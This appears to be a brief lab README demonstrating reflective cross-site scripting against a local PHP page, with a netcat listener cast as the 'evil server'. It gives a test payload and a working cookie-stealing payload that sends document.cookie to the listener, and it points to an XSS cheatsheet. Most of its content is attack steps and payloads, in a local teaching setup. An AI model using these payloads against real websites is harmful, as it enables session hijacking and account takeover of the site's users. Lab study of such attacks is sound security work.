# Reflective XSS

1. Start the target server: `php -S localhost:8000`
2. Start the evil server: `nc -v -l -p 9999`

3. Make sure xss works:
  * `http://localhost:8000/target.php?foo=<script>alert(1);</script>`

4. Exploits:
  * steal cookie: `<script>new Image().src="http://localhost:9999/"%2bdocument.cookie;</script>`

Notes:
* see cheatsheet for xss snippits: [https://html5sec.org/](cheatsheet)
